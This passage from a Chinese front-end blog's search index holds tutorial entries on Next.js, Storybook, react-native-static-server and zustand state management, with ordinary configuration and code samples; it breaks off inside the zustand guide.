theme(\u0026#34;colors.gray.800\u0026#34;); --accent-dark: theme(\u0026#34;colors.fuchsia.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.fuchsia.700\u0026#34;); --accent-light: theme(\u0026#34;colors.fuchsia.500\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.300\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.200\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.100\u0026#34;); } [data-theme=\u0026#34;emerald\u0026#34;] { --background: theme(\u0026#34;colors.white\u0026#34;); --accent-dark: theme(\u0026#34;colors.emerald.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.emerald.700\u0026#34;); --accent-light: theme(\u0026#34;colors.emerald.500\u0026#34;); } [data-theme=\u0026#34;pink\u0026#34;] { --background: theme(\u0026#34;colors.gray.900\u0026#34;); --background-secondary: theme(\u0026#34;colors.gray.800\u0026#34;); --accent-dark: theme(\u0026#34;colors.pink.900\u0026#34;); --accent-medium: theme(\u0026#34;colors.pink.700\u0026#34;); --accent-light: theme(\u0026#34;colors.pink.500\u0026#34;); --primary-dark: theme(\u0026#34;colors.gray.300\u0026#34;); --primary-medium: theme(\u0026#34;colors.gray.200\u0026#34;); --primary-light: theme(\u0026#34;colors.gray.100\u0026#34;); }   注意： 使用 yarn build前，需要把本地服务停掉，否则会构建失败。\n\r4. 安装 Storybook Step1. 安装 sb 1 2  npx sb init   Step2. 安装 postCSS 插件 1 2  yarn add -D @storybook/addon-postcss   Step3. 将插件添加到 .storybook/main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // .storybook/main.js module.exports = { ... addons: [ ... { name: \u0026#39;@storybook/addon-postcss\u0026#39;, options: { cssLoaderOptions: { // When you have splitted your css over multiple files  // and use @import(\u0026#39;./other-styles.css\u0026#39;)  importLoaders: 1, }, postcssLoaderOptions: { // When using postCSS 8  implementation: require(\u0026#39;postcss\u0026#39;), }, }, }, ], };   Step4. 将 css 文件导入 .storybook/preview.js 1 2  import \u0026#39;../styles/globals.css\u0026#39;   Step5. 为 Storybook 配置 NextJS Images 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // .storybook/preview.js + import * as NextImage from \u0026#34;next/image\u0026#34;; + const OriginalNextImage = NextImage.default; + Object.defineProperty(NextImage, \u0026#34;default\u0026#34;, { configurable: true, value: (props) =\u0026gt; ( \u0026lt;OriginalNextImage {...props} unoptimized /\u0026gt; ), });   Step6. 为 Storybook 提供 Next.js 公共目录 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // package.json { ... \u0026#34;scripts\u0026#34;: { - \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006\u0026#34;, - \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook\u0026#34; + \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006 -s ./public\u0026#34;, + \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook -s public\u0026#34; }, ... }   ","description":"Next.js 与各种技术栈的组合","id":60,"section":"react","tags":null,"title":"Next.js 各种组合","uri":"https://codthing.github.io/react/next/next-multiple/"},{"content":"Next.js 简介 Next.js 由 Vercel 创建，是一个混合 React 应用程序的框架。\n通常很难理解加载内容的所有不同方式。 Next.js 将其抽象化以使其尽可能简单。 该框架允许构建可扩展、高性能的 React 代码，并带有零配置方法。 这使开发人员可以专注于构建功能。\n让我们探索与讨论相关的 Next.js 功能\n\r基本功能 预渲染 默认情况下，Next.js 会提前为每个页面生成 HTML，而不是在客户端生成。这个过程称为预渲染。\nNext.js 确保使页面完全交互所需的 JavaScript 代码与生成的 HTML 相关联。\n一旦页面加载，此 JavaScript 代码就会运行。此时，React JS 在 Shadow DOM 中工作以确保呈现的内容与 React 应用程序将呈现的内容相匹配，而无需实际操作它。这个过程称为水合作用。\n每个页面都是从 pages 目录中的 .js、.jsx、.ts 或 .tsx 文件导出的 React 组件。路由是根据文件名确定的。\n例如 pages/about.js 对应路由/about。\nNext.js 支持通过服务器端渲染 (SSR) 和静态生成进行预渲染。\n还可以在同一个应用程序中混合不同的渲染方法，其中一些页面使用 SSR 生成，而其他页面使用静态生成。客户端呈现也可用于呈现这些页面的某些部分。\n数据获取 Next.js 支持使用 SSR 和静态生成来获取数据。\nNext.js 框架中的以下功能使这成为可能。\n  getStaticProps\n  与静态生成一起使用来渲染数据\n  getStaticPaths\n  与静态生成一起使用以呈现动态路由\n  getServerSideProps\n  适用于SSR\n  静态文件服务\n  像图像这样的静态文件可以在根目录中名为 public 的文件夹下提供。 然后可以使用根 URL 在不同页面上的 \u0026lt;img\u0026gt; 标记代码中引用相同的图像。 例如，src=/logo.png。\n自动图像优化 Next.js 实现了自动图像优化，它允许在浏览器支持时以现代格式调整图像大小、优化和提供图像。 因此，在需要时会针对较小的视口调整大图像的大小。\n图像优化是通过导入 Next.js Image 组件来实现的，该组件是 HTML \u0026lt;img\u0026gt; 元素的扩展。 要使用 Image 组件，应按如下方式导入。\nimport Image from \u0026#39;next/image\u0026#39; 可以使用以下代码在页面上提供图像组件。\n\u0026lt;Image src=\u0026#34;/logo.png\u0026#34; alt=\u0026#34;Logo\u0026#34; width={500} height={500} /\u0026gt; 路由 Next.js 支持通过 pages 目录进行路由。 此目录或其嵌套子目录中的每个 .js 文件都成为具有相应路由的页面。\nNext.js 还支持使用命名参数创建动态路由，其中显示的实际文档由参数的值决定。\n例如，页面 pages/products/[pid].js 将匹配 /post/1 之类的路由，其中 pid=1 作为查询参数之一。\nNext.js 也支持链接到其他页面上的这些动态路由\n代码拆分 代码拆分确保仅将所需的 JavaScript 发送到客户端，这有助于提高性能。\nNext.js 支持两种类型的代码拆分。\n  基于路由：这是在 Next.js 中默认实现的。 当用户访问一个路由时，Next.js 只发送初始路由所需的代码。 当用户浏览应用程序时，会根据需要下载其他块。 这限制了需要一次解析和编译的代码量，从而缩短了页面加载时间。\n  基于组件：这种类型的代码拆分允许将大型组件拆分为单独的块，可以在需要时延迟加载。 Next.js 通过动态 import() 支持基于组件的代码拆分。 这允许您动态导入 JavaScript 模块（包括 React 组件）并将每个导入作为单独的块加载。\n  \r开始 Next.js 的方式 Next.js 可以安装在任何带有 Node.js 10.13 或更高版本的 Linux、Windows 或 Mac OS 上。 自动和手动设置选项均可用。\n使用 create-next-app 自动设置\nyarn create next-app --typescript 安装后，可以运行开发服务器并访问 http://localhost:3000 上的页面。\n通过对 Next.js 的介绍，现在可以研究不同模式的实现。\n\r知识点  预渲染 水合作用 路由 getStaticProps getStaticPaths 静态文件服务 public Image 路由 代码拆分  ","description":"Vercel 的混合 React 应用程序框架","id":61,"section":"react-patterns","tags":null,"title":"Next.js 概述","uri":"https://codthing.github.io/react-patterns/render-patterns/overview-next/"},{"content":"搭建本地静态服务器和使用本地静态资源， 需要在expo弹出的裸漏工作流中\nStep1. 配置android文件 /android/app/build.gradle 中添加 sourceSets { main { assets.srcDirs = ['src/main/assets','../../assets']}}\nandroid {\rcompileSdkVersion rootProject.ext.compileSdkVersion\rcompileOptions {\rsourceCompatibility JavaVersion.VERSION_1_8\rtargetCompatibility JavaVersion.VERSION_1_8\r}\rdefaultConfig {\rapplicationId \u0026#39;com.fengmo.GA08\u0026#39;\rminSdkVersion rootProject.ext.minSdkVersion\rtargetSdkVersion rootProject.ext.targetSdkVersion\rversionCode 1\rversionName \u0026#34;1.0.0\u0026#34;\r}\rsplits {\rabi {\rreset()\renable enableSeparateBuildPerCPUArchitecture\runiversalApk false // If true, also generate a universal APK\rinclude \u0026#34;armeabi-v7a\u0026#34;, \u0026#34;x86\u0026#34;, \u0026#34;arm64-v8a\u0026#34;, \u0026#34;x86_64\u0026#34;\r}\r}\rsigningConfigs {\rdebug {\rstoreFile file(\u0026#39;debug.keystore\u0026#39;)\rstorePassword \u0026#39;android\u0026#39;\rkeyAlias \u0026#39;androiddebugkey\u0026#39;\rkeyPassword \u0026#39;android\u0026#39;\r}\r}\rbuildTypes {\rdebug {\rsigningConfig signingConfigs.debug\r}\rrelease {\r// Caution! In production, you need to generate your own keystore file.\r// see https://reactnative.dev/docs/signed-apk-android.\rsigningConfig signingConfigs.debug\rminifyEnabled enableProguardInReleaseBuilds\rproguardFiles getDefaultProguardFile(\u0026#34;proguard-android.txt\u0026#34;), \u0026#34;proguard-rules.pro\u0026#34;\r}\r}\r// applicationVariants are e.g. debug, release\rapplicationVariants.all { variant -\u0026gt;\rvariant.outputs.each { output -\u0026gt;\r// For each separate APK per architecture, set a unique version code as described here:\r// https://developer.android.com/studio/build/configure-apk-splits.html\rdef versionCodes = [\u0026#34;armeabi-v7a\u0026#34;: 1, \u0026#34;x86\u0026#34;: 2, \u0026#34;arm64-v8a\u0026#34;: 3, \u0026#34;x86_64\u0026#34;: 4]\rdef abi = output.getFilter(OutputFile.ABI)\rif (abi != null) { // null for the universal-debug, universal-release variants\routput.versionCodeOverride =\rversionCodes.get(abi) * 1048576 + defaultConfig.versionCode\r}\r}\r}\r+ sourceSets { main { assets.srcDirs = [\u0026#39;src/main/assets\u0026#39;,\u0026#39;../../assets\u0026#39;]}}\r} Step2. 安装静态服务器 yarn add react-native-static-server Step3. 安装文件系统 yarn add react-native-fs Step4. 安装html渲染组件 expo install react-native-webview Step5. 项目根目录中新建type.d.ts declare module \u0026#39;react-native-static-server\u0026#39;\rdeclare module \u0026#39;react-native-fs\u0026#39; Step6. assets/www 中放置静态html项目文件 Step7. 启动本地开发服务器 yarn start Step8. 将开发apk打包到模拟器测试成果 yarn android Step9. 如果打包后的apk打开页面不显示  Domain: undefine\nError Code:-1\n 需要在 android/app/src/main/AndroidManifest.xml 中的\u0026lt;application\u0026gt;中添加 android:usesCleartextTraffic=\u0026quot;true\u0026quot;\n\u0026lt;application android:name=\u0026#34;.MainApplication\u0026#34; android:label=\u0026#34;@string/app_name\u0026#34; android:icon=\u0026#34;@mipmap/ic_launcher\u0026#34; + android:usesCleartextTraffic=\u0026#34;true\u0026#34; android:roundIcon=\u0026#34;@mipmap/ic_launcher_round\u0026#34; android:allowBackup=\u0026#34;true\u0026#34; android:theme=\u0026#34;@style/AppTheme\u0026#34;\r\u0026gt;  以上只是流程步骤，具体逻辑代码未在这里展示\n 注意 修改静态文件后，如果yarn android报错\n Unable to delete directory\n 需要先删除本地 android\\app\\build\\intermediates\\merged_assets\\debug\\out\\ 中的文件，再yarn android才不会报错。\n","description":"","id":62,"section":"react-native","tags":null,"title":"react-native-static-server","uri":"https://codthing.github.io/react-native/react-native/react-native-static-server/"},{"content":"一、goBack()返回上一屏幕刷新状态的方法 通过路由传递数据时，当向同一个页面（详情页）传递一些唯一数据，使用push，而不是 navigate，这样才能保证整个组件重新执行。\n","description":"","id":63,"section":"react-native","tags":null,"title":"React-Navigation","uri":"https://codthing.github.io/react-native/expo/react-navigation/"},{"content":"Story 介绍 Story（故事）捕获 UI 组件的呈现状态。 开发人员为每个组件编写多个故事，描述组件可以支持的所有“有趣”状态。\n每个组件都有一组故事，显示它支持的状态。\n可以在 UI 中浏览故事，并在以 .stories.js 或 .stories.ts 结尾的文件中查看故事背后的代码。\n这些故事以组件故事格式 (CSF) 编写，这是一种基于 ES6 模块的标准，用于编写组件示例。\n从 Button 组件开始。 故事是描述如何呈现相关组件的函数。 以下是如何在 Primary 状态下渲染 Button 并导出一个名为 Primary 的故事。\n1 2 3 4 5 6 7 8 9 10 11 12 13  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Button\u0026#39;, component: Button, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; export const Primary: ComponentStory\u0026lt;typeof Button\u0026gt; = () =\u0026gt; \u0026lt;Button primary\u0026gt;Button\u0026lt;/Button\u0026gt;;   编写文档（可选）\n\u0026lt;!-- Button.stories.mdx --\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { Button } from \u0026#39;./Button\u0026#39;;\r\u0026lt;Meta title=\u0026#34;Button\u0026#34; component={Button} /\u0026gt;\r# Button\r\u0026lt;Story name=\u0026#34;Primary\u0026#34;\u0026gt;\r\u0026lt;Button primary\u0026gt;Button\u0026lt;/Button\u0026gt;\r\u0026lt;/Story\u0026gt; 通过在 Storybook 侧栏中单击它来查看呈现的 Button。\n\rargs 可以进一步改进上述故事定义以利用 Storybook 的 args 概念。 Args 以机器可读的方式描述 Button 的参数。\n它释放了 Storybook 动态改变和撰写论点的超能力。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // Button.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { Button, ButtonProps } from \u0026#39;./Button\u0026#39;; export default { title: \u0026#39;Button\u0026#39;, component: Button, } as ComponentMeta\u0026lt;typeof Button\u0026gt;; //👇 我们创建了 args 如何映射到渲染的 template（模板） const Template: ComponentStory\u0026lt;typeof Button\u0026gt; = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;; export const Primary = Template.bind({}); Primary.args = { primary: true, label: \u0026#39;Button\u0026#39;, };   编写文档（可选）\n\u0026lt;!-- Button.stories.mdx--\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { Button } from \u0026#39;./Button\u0026#39;;\r\u0026lt;Meta title=\u0026#34;Button\u0026#34; component={Button} /\u0026gt;\r\u0026lt;!-- 👇 我们创建了 args 如何映射到渲染的 template（模板） --\u0026gt;\rexport const Template = (args) =\u0026gt; \u0026lt;Button {...args} /\u0026gt;;\r\u0026lt;!-- 👇 每个故事重用该模板 --\u0026gt;\r\u0026lt;Story\rname=\u0026#34;Primary\u0026#34;\rargs={{\rprimary: true,\rlabel: \u0026#39;Button\u0026#39;,\r}}\u0026gt;\r{Template.bind({})}\r\u0026lt;/Story\u0026gt; 两个故事示例渲染相同的内容，因为 Storybook 在渲染期间将给定的 args 属性提供给故事。\n可以通过 args 获得省时的便利：\n  按钮回调记录到 Action 选项卡中。 单击以尝试它\n  按钮参数可在 Controls 选项卡中动态编辑。 调整控件\n  \r编辑故事 Storybook 可以轻松地一次处理一种状态（又名故事）中的一个组件。\n当编辑 Button 代码或故事时，Storybook 将立即在浏览器中重新呈现。 无需手动刷新。\n更新主要故事的标签，然后在 Storybook 中查看更改。\n故事还有助于检查 UI 在更改时是否继续保持正确。\nButton 组件有四个故事，在不同的用例中展示它。\n现在查看这些故事，以确认对主要的更改没有在其他故事中引入无意的错误。\n在开发时检查组件的故事有助于防止意外回归。 与 Storybook 集成的工具也可以自动化。\n现在已经了解了故事的基本结构，让我们看看如何使用 Storybook 的 UI 来开发故事。\n\r知识点   args\n  Action\n  Controls\n  ","description":"","id":64,"section":"react","tags":null,"title":"Story 是什么？","uri":"https://codthing.github.io/react/storybook/sb-started/sb-what/"},{"content":"zustand 基于 hooks 的 api，小型、快速且可扩展的状态管理解决方案。\n一、安装 yarn add zustand 二、最简使用方法 Step1. 创建一个 Store store 是一个钩子！ 可以在里面放任何东西：原始数据（string，number，bigint，boolean，null）、对象、方法。 set 方法合并状态。\nimport create from \u0026#39;zustand\u0026#39;\rconst useCount = create(set =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count + 1 })),\rminus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count - 1 })),\rreset: () =\u0026gt; set({ count: 0 })\r})) Step2. 绑定组件 function Counter() {\rconst count = useCount(state =\u0026gt; state.count)\rreturn \u0026lt;h1\u0026gt;{count}\u0026lt;/h1\u0026gt;\r}\rfunction Controls() {\rconst plus = useCount(state =\u0026gt; state.plus)\rconst minus= useCount(state =\u0026gt; state.minus)\rconst reset= useCount(state =\u0026gt; state.reset)\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;button onClick={plus}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={minus}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={reset}\u0026gt;重置\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r)\r} 二、强制渲染组件 记住，它会导致组件在每次状态更改时渲染！\nconst state = useStore() 三、state 更新渲染组件 切片状态（slice state）,因为store是一个原子状态，可以将它切分为多个格子状态，便于代码管理。\n1. 单个 state 更新渲染 默认情况下，它以严格相等（旧 === 新）检测更改，这对于原子状态选择非常有效。\nconst nuts = useStore(state =\u0026gt; state.nuts)\rconst honey = useStore(state =\u0026gt; state.honey) 2. 多个 state 更新（浅差异）渲染 如果想构造一个内部有多个 state-picks(状态选择) 的单个对象，类似于 redux 的 mapStateToProps，可以告诉 zustand 你希望通过传递shallow相等函数来对对象进行浅差异。\n1 2 3 4 5 6 7 8 9 10 11  import shallow from \u0026#39;zustand/shallow\u0026#39; // 对象选择，当 `state.nuts` 或 `state.honey` 改变时重新渲染组件 const { nuts, honey } = useStore(state =\u0026gt; ({ nuts: state.nuts, honey: state.honey }), shallow) // 数组选择，当 `state.nuts` 或 `state.honey` 改变时重新渲染组件 const [nuts, honey] = useStore(state =\u0026gt; [state.nuts, state.honey], shallow) // 映射选择，当 `state.treats` 按 `count` 或 `keys` 顺序改变时重新渲染组件 const treats = useStore(state =\u0026gt; Object.keys(state.treats), shallow)   3. 自定义函数控制渲染 为了更好地控制重新渲染，可以提供任何自定义的相等函数。\nconst treats = useStore(\rstate =\u0026gt; state.treats,\r(oldTreats, newTreats) =\u0026gt; compare(oldTreats, newTreats)\r) 四、记忆处理器（避免重复计算） 1. useCallback() 处理器 通常建议使用 useCallback 记忆处理器。 这将防止每次渲染时进行不必要的计算。 它还允许 React 在并发模式下优化性能。\nconst fruit = useStore(useCallback(state =\u0026gt; state.fruits[id], [id])) 2. 不依赖于作用域的处理器 如果一个处理器不依赖于作用域，可以在渲染函数之外定义它以获得一个固定的“引用”而无需 useCallback。\nconst selector = state =\u0026gt; state.berries\rfunction Component() {\rconst berries = useStore(selector)\r} 五、覆盖state（抹去之前的state） set 函数有第二个参数，默认为 false。 它将取代state模型，而不是合并。 注意它会抹去你依赖的部分，比如actions。\n1 2 3 4 5 6 7 8 9  import omit from \u0026#34;lodash-es/omit\u0026#34; const useStore = create(set =\u0026gt; ({ salmon: 1, tuna: 2, deleteEverything: () =\u0026gt; set({ }, true), // 清除整个存储，包括操作  deleteTuna: () =\u0026gt; set(state =\u0026gt; omit(state, [\u0026#39;tuna\u0026#39;]), true) }))   六、异步操作（fetch请求） 调用 set ， zustand 不关心操作是否异步。\nconst useStore = create(set =\u0026gt; ({\rgirls: {},\rfetch: async pond =\u0026gt; {\rconst response = await fetch(pond)\rset({ girls: await response.json() })\r}\r})) 七、从 action 中读取 state 通过get访问状态。\nconst useStore = create((set, get) =\u0026gt; ({\rname: \u0026#34;Lucy\u0026#34;,\raction: () =\u0026gt; {\rconst name= get().name\r// ...\r}\r}) 八、在 React 组件之外读写 state 1. 自定义 hooks 读写 state 有时需要以非React方式访问状态，或对store进行操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const useStore = create(() =\u0026gt; ({ paw: true, snout: true, fur: true })) // 在React组件之外获取state const paw = useStore.getState().paw //true  // 侦听所有更改，在每次更改时同步触发 const unsub = useStore.subscribe(console.log) // 更新状态，将触发侦听器 useStore.setState({ paw: false }) // 取消订阅侦听 unsub() // 销毁商店（删除所有侦听器） useStore.destroy() // 当然可以像hook一样使用 function Component() { const paw = useStore(state =\u0026gt; state.paw)   2. 使用订阅处理器（中间件） 如果您需要使用处理器订阅，subscribeWithSelector 中间件会有所帮助。\n有了这个中间件，subscribe 接受一个额外的签名：\nsubscribe(selector, callback, options?: { equalityFn, fireImmediately }): Unsubscribe 1 2 3 4 5 6 7 8 9 10 11 12  import { subscribeWithSelector } from \u0026#39;zustand/middleware\u0026#39; const useStore = create(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true }))) // 订阅状态值变化 const unsub2 = useStore.subscribe(state =\u0026gt; state.paw, console.log) // 订阅上一个状态值 const unsub3 = useStore.subscribe(state =\u0026gt; state.paw, (paw, previousPaw) =\u0026gt; console.log(paw, previousPaw)) // 订阅一个可选的浅差异方法 const unsub4 = useStore.subscribe(state =\u0026gt; [state.paw, state.fur], console.log, { equalityFn: shallow }) // 解除订阅 const unsub5 = useStore.subscribe(state =\u0026gt; state.paw, console.log, { fireImmediately: true })   3. 订阅处理器（中间件）使用TS import create, { GetState, SetState } from \u0026#39;zustand\u0026#39;\rimport { StoreApiWithSubscribeWithSelector, subscribeWithSelector } from \u0026#39;zustand/middleware\u0026#39;\rtype BearState = {\rpaw: boolean\rsnout: boolean\rfur: boolean\r}\rconst useStore = create\u0026lt;\rBearState,\rSetState\u0026lt;BearState\u0026gt;,\rGetState\u0026lt;BearState\u0026gt;,\rStoreApiWithSubscribeWithSelector\u0026lt;BearState\u0026gt;\r\u0026gt;(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true }))) 九、瞬时更新ref（用于频繁发生的状态变化） 订阅功能允许组件绑定到state，而无需在更改时强制重新渲染。 最好将它与 useEffect 结合使用，以便在卸载时自动取消订阅。 当直接改变视图时，这会对性能产生巨大影响。\nconst useStore = create(set =\u0026gt; ({ girlNum: 0, ... }))\rfunction Component() {\r// 获取初始状态\rconst girlNumRef = useRef(useStore.getState().girlNum)\r// 在挂载时连接到Store，在卸载时断开连接，在引用时捕获状态变化\ruseEffect(() =\u0026gt; useStore.subscribe(\rstate =\u0026gt; (girlNumRef.current = state.girlNum)\r), []) 十、更新嵌套的状态，使用 Immer 嵌套结构令人厌烦。 可以使用 Immer 处理深层嵌套的state\nimport produce from \u0026#39;immer\u0026#39;\rconst useStore = create(set =\u0026gt; ({\rlush: { forest: { contains: { a: \u0026#34;bear\u0026#34; } } },\rclearForest: () =\u0026gt; set(produce(state =\u0026gt; {\rstate.lush.forest.contains = null\r}))\r}))\rconst clearForest = useStore(state =\u0026gt; state.clearForest)\rclearForest(); 十一、中间件 1. 按自己喜欢的方式管理store 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // 记录每次改变的state const log = config =\u0026gt; (set, get, api) =\u0026gt; config(args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api) // 将 set 方法变成一个 immer proxy const immer = config =\u0026gt; (set, get, api) =\u0026gt; config((partial, replace) =\u0026gt; { const nextState = typeof partial === \u0026#39;function\u0026#39; ? produce(partial) : partial return set(nextState, replace) }, get, api) const useStore = create( log( immer((set) =\u0026gt; ({ bees: false, setBees: (input) =\u0026gt; set((state) =\u0026gt; void (state.bees = input)), })), ), )   2. 管理中间件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import create from \u0026#34;zustand\u0026#34; import produce from \u0026#34;immer\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; /* 上一个例子中的日志和immer函数 */ /* 通过pipe集合任意数量的中间件 */ const createStore = pipe(log, immer, create) const useStore = createStore(set =\u0026gt; ({ bears: 1, increasePopulation: () =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + 1 })) })) export default useStore   3. 在管理中间件中使用TS yarn add --dev @types/ramda 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  import create from \u0026#34;zustand\u0026#34; import { devtools, redux } from \u0026#34;zustand/middleware\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; const log: typeof devtools = config =\u0026gt; (set, get, api) =\u0026gt; config( args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api ) export type State = { grumpiness: number } const initialState: State = { grumpiness: 0, } const createStore = pipe(redux, devtools, log, create) enum types { increase = \u0026#34;INCREASE\u0026#34;, decrease = \u0026#34;DECREASE\u0026#34;, } const reducer = ( state: State, { type, by = 1 }: { type: types; by: number } ) =\u0026gt; { switch (type) { case types.increase: return { grumpiness: state.grumpiness + by } case types.decrease: return { grumpiness: state.grumpiness - by } } } const useStore = createStore(reducer, initialState) export default useStore   十二、状态持久化中间件 persist 可以存储任何类型的store数据。（localStorage，AsyncStorage，IndexedDB，等\u0026hellip;）\n1. 快速示例 import create from \u0026#34;zustand\u0026#34;\rimport { persist } from \u0026#34;zustand/middleware\u0026#34;\rexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set({ count: get().count + 1 })\r}),\r{\rname: \u0026#34;count-storage\u0026#34;, // 唯一的名称\rgetStorage: () =\u0026gt; sessionStorage, // （可选）默认情况下，使用“localStorage”\r}\r)) 2. 选项   name 这是唯一需要的选项。给定的名称将是用于存储state的键，因此它必须是唯一的。\n  getStorage 默认： () =\u0026gt; localStorage\n  给定的存储必须与以下接口匹配：\n1 2 3 4 5 6  interface Storage { getItem: (name: string) =\u0026gt; string | null | Promise\u0026lt;string | null\u0026gt; setItem: (name: string, value: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; removeItem: (name: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; }   serialize（序列化）   Schema: (state: Object) =\u0026gt; string | Promise\u0026lt;string\u0026gt; Default: (state) =\u0026gt; JSON.stringify(state)  由于将对象存储在 storage 中的唯一方法是通过字符串，可以使用此选项提供自定义函数将 state 序列化为字符串。\n例如，如果您想将 state 存储在 base64 中：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rserialize: (state) =\u0026gt; btoa(JSON.stringify(state)),\r}\r)) 请注意，还需要一个自定义deserialize函数才能使其正常工作。见下文\ndeserialize （反序列化）   Schema: (str: string) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (str) =\u0026gt; JSON.parse(str)  如果使用自定义序列化函数，则很可能还需要使用自定义反序列化函数。它们是一对搭档。\n要继续上面的示例，可以使用以下命令反序列化 base64 值：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rdeserialize: (str) =\u0026gt; JSON.parse(atob(str)),\r}\r)) partialize (初始化部分state)   Schema: (state: Object) =\u0026gt; Object Default: (state) =\u0026gt; state  它够省略一些要存储在 storage 中的 state 字段。\n可以使用以下方法省略多个字段：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt;\rObject.fromEntries(\rObject.entries(state).filter(([key]) =\u0026gt; ![\u0026#34;foo\u0026#34;].includes(key))\r),\r}\r)) 或者只允许存储特定state字段：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt; ({ foo: state.foo })\r}\r)) onRehydrateStorage （水和存储）   Schema: (state: Object) =\u0026gt; ((state?: Object, error?: Error) =\u0026gt; void) | void  此选项能够在水合存储时调用的侦听器函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  export const useStore = create(persist( (set, get) =\u0026gt; ({ // ...  }), { // ...  onRehydrateStorage: (state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); //水合开始 \t// 可选  return (state, error) =\u0026gt; { if (error) { console.log(\u0026#34;an error happened during hydration\u0026#34;, error) //水合过程中发生错误  } else { console.log(\u0026#34;hydration finished\u0026#34;) //水合完成  } } } } ))   version 指定存储版本   Schema: number Default: 0  如果在 storage 中引入重大更改（例如重命名字段），可以指定新版本号。\n默认情况下，如果 storage 中的版本与代码中的版本不匹配，则不会使用 storage 的值。\n有关处理重大更改的更多详细信息，请参阅下面的选项migrate\nmigrate 版本迁移   Schema: (persistedState: Object, version: number) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (persistedState) =\u0026gt; persistedState  可以使用此选项来处理版本迁移。migrate 函数将持久化state和版本号作为参数。\n它必须返回符合最新版本（代码中的版本）的state。\n例如，如果要重命名字段，可以使用以下命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  export const useStore = create(persist( (set, get) =\u0026gt; ({ newField: 0, // 假设该字段在版本 0 中以其他方式命名  }), { // ...  version: 1, // 如果 storage 中的版本与此迁移不匹配，则会触发：  migrate: (persistedState, version) =\u0026gt; { if (version === 0) { // 如果存储的值在版本为 0 ，则将该字段重命名为新名称  persistedState.newField = persistedState.oldField; delete persistedState.oldField; } return persistedState; }, } ))   merge 合并存储值和state    Schema: (persistedState: Object, currentState: Object) =\u0026gt; Object\n  Default: (persistedState, currentState) =\u0026gt; ({ ...currentState, ...persistedState })\n  在某些情况下，希望使用自定义合并函数将持久值与当前状态合并。\n默认情况下，中间件进行浅合并。如果部分持久化了嵌套对象，那么浅层合并可能还不够。\n例如，如果存储包含以下内容：\n{\rfoo: {\rbar: 0,\r}\r} 但是你的 Zustand store 包含:\n{\rfoo: {\rbar: 0,\rbaz: 1,\r}\r} 浅合并将从对象 foo 中擦除 baz 字段。解决此问题的一种方法是提供自定义深度合并功能：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: {\rbar: 0,\rbaz: 1,\r},\r}),\r{\r// ...\rmerge: (persistedState, currentState) =\u0026gt; deepMerge(currentState, persistedState),\r}\r)) 3. API persist api 使 React 组件的内部或外部与持久中间件进行大量交互。\n setOptions 更改中间件选项   Schema: (newOptions: PersistOptions) =\u0026gt; void  